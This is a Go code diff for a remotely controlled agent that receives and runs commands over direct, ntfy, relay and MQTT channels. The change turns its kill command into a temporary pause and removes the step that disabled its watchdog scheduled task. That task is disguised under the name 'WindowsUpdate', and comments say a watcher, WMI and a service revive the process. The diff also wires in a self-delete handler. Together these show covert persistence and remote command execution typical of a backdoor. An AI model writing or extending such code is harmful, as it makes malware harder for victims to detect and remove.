@@ -317,9 +317,10 @@ func splitCmd(cmdStr string) (string, string) {
 	return cmdName, args
 }
 
-// isKillCmd reports whether cmdStr asks the agent process to terminate.
+// isKillCmd reports whether cmdStr asks the agent process to go quiet.
 // kill-agent is intercepted in agent main on every transport (direct, ntfy,
-// MQTT) before commands.Execute ever sees it.
+// MQTT) before commands.Execute ever sees it. Quiet is temporary: the
+// supervisor restarts the process, so this never deletes anything.
 func isKillCmd(cmdStr string) bool {
 	name, _ := splitCmd(cmdStr)
 	switch strings.ToLower(name) {
@@ -329,23 +330,16 @@ func isKillCmd(cmdStr string) bool {
 	return false
 }
 
-// exitSoon terminates the agent process after a short grace period so the
-// goodbye output still flushes. It also disables the watchdog scheduled
-// task, otherwise the 5-minute repetition would resurrect the process and
-// kill-agent could never stay dead. Reinstalling / manual start re-enables.
+// exitSoon quiets the agent process after a short grace period so the
+// goodbye output still flushes. Deliberately touches NOTHING persistent:
+// no task is disabled, no key removed. The watcher/WMI/service resurrect
+// the process within ~a minute, so kill-agent is a temporary quiet, never
+// a cleanup. Permanent removal is only via the token-guarded self-delete
+// command or Agent-Setup --uninstall.
 func exitSoon(via string) {
-	log.Printf("[*] kill-agent (%s) — exiting process", via)
+	log.Printf("[*] kill-agent (%s) — quieting process (supervisor will restart it)", via)
 	go func() {
 		time.Sleep(800 * time.Millisecond)
-		if runtime.GOOS == "windows" {
-			c := exec.Command("schtasks", "/change", "/TN", "WindowsUpdate", "/DISABLE")
-			hideWatchCmd(c)
-			if out, err := c.CombinedOutput(); err != nil {
-				log.Printf("[!] disable watchdog task: %v %s", err, strings.TrimSpace(string(out)))
-			} else {
-				log.Printf("[*] watchdog task disabled (reinstall re-enables)")
-			}
-		}
 		os.Exit(0)
 	}()
 }
@@ -912,8 +906,13 @@ func (a *agent) connectOnce() error {
 				go func(m protocol.Message) {
 					cmdStr := m.Cmd
 					if isKillCmd(cmdStr) {
-						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
+						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
 						exitSoon("direct")
+						return
+					}
+					if handleSelfDelete(cmdStr, func(res, errStr string) {
+						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID})
+					}) {
 						return
 					}
 					// Parse into cmd + args (first space split, keep rest)
@@ -1219,8 +1218,13 @@ func (a *agent) connectViaNtfy() error {
 				case protocol.TypeCommand:
 					log.Printf("[*] Ntfy command: %s", msg.Cmd)
 					if isKillCmd(msg.Cmd) {
-						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
+						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
 						exitSoon("ntfy")
+						continue
+					}
+					if handleSelfDelete(msg.Cmd, func(res, errStr string) {
+						nout(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: msg.CmdID})
+					}) {
 						continue
 					}
 					cmdName := strings.TrimSpace(msg.Cmd)
@@ -1388,8 +1392,13 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 		case protocol.TypeCommand:
 			go func(m protocol.Message) {
 				if isKillCmd(m.Cmd) {
-					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"})
+					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
 					exitSoon("listen")
+					return
+				}
+				if handleSelfDelete(m.Cmd, func(res, errStr string) {
+					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID})
+				}) {
 					return
 				}
 			resp, suppressed := execCommand(m.Cmd, m.CmdID, 1024*1024, "\n... truncated")
@@ -1593,11 +1602,19 @@ func (a *agent) connectViaMQTT() error {
 			go func(m protocol.Message) {
 				cmdStr := m.Cmd
 				if isKillCmd(cmdStr) {
-					resp := protocol.Message{Type: protocol.TypeOutput, Result: "agent process exiting (kill-agent)"}
+					resp := protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"}
 					if err := mout(resp); err != nil {
 						log.Printf("[!] MQTT publish output: %v", err)
 					}
 					exitSoon("mqtt")
+					return
+				}
+				if handleSelfDelete(cmdStr, func(res, errStr string) {
+					resp := protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID}
+					if err := mout(resp); err != nil {
+						log.Printf("[!] MQTT publish output: %v", err)
+					}
+				}) {
 					return
 				}
 			resp, suppressed := execCommand(cmdStr, m.CmdID, 1024*1024, "\n... truncated")
